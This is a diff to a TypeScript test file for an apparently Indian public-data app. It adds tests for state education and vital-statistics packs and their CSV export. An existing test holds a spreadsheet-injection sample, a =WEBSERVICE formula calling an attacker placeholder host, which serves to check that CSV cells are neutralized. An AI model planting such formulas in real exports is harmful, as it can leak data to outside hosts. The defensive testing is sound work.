@@ -4,6 +4,9 @@ import { safeCsvCell, safeDownloadSlug } from "../lib/csv";
 import { canSubmitReview } from "../lib/editor-auth";
 import { assertPublicHttpsUrl } from "../lib/safe-source-probe";
 import { safeSupportingUrl } from "../app/api/corrections/route";
+import { GET as exportStatePacks } from "../app/api/state-packs/export/route";
+import { jurisdictions } from "../lib/evidence";
+import { educationByJurisdiction, vitalByJurisdiction } from "../lib/state-packs";
 
 test("neutralizes spreadsheet formulas and hostile download names",()=>{
   assert.equal(safeCsvCell("=WEBSERVICE(\"https://attacker.invalid\")"),'"\'=WEBSERVICE(""https://attacker.invalid"")"');
@@ -30,4 +33,24 @@ test("accepts only credential-free HTTPS correction evidence links",()=>{
   assert.equal(safeSupportingUrl("https://user:pass@example.gov.in/report.pdf"),undefined);
   assert.equal(safeSupportingUrl("https://example.gov.in:8443/report.pdf"),undefined);
   assert.equal(safeSupportingUrl("https://example.gov.in/report.pdf\nInjected"),undefined);
+});
+
+test("all-state periodic packs cover exactly the jurisdiction model and preserve published totals",()=>{
+  const names=jurisdictions.map(item=>item.name).sort();
+  assert.equal(jurisdictions.length,36);
+  assert.deepEqual(Object.keys(educationByJurisdiction).sort(),names);
+  assert.deepEqual(Object.keys(vitalByJurisdiction).sort(),names);
+  assert.equal(Object.values(educationByJurisdiction).reduce((sum,item)=>sum+item.schools,0),1_471_891);
+  assert.equal(Object.values(educationByJurisdiction).reduce((sum,item)=>sum+item.enrolments,0),248_045_828);
+  assert.equal(Object.values(educationByJurisdiction).reduce((sum,item)=>sum+item.teachers,0),9_807_600);
+  assert.ok(Object.values(vitalByJurisdiction).every(item=>item.birthRate>0&&item.deathRate>0&&item.infantMortalityRate>=0));
+});
+
+test("state-pack CSV export is complete, source-labelled and download-safe",async()=>{
+  const response=await exportStatePacks();
+  const csv=await response.text();
+  assert.equal(csv.trim().split("\n").length,37);
+  assert.match(csv,/"Maharashtra","State","108237","21375970","738114"/);
+  assert.match(csv,/"education_source","vital_source"/);
+  assert.match(response.headers.get("content-disposition")??"",/^attachment; filename=[a-z0-9.-]+$/);
 });
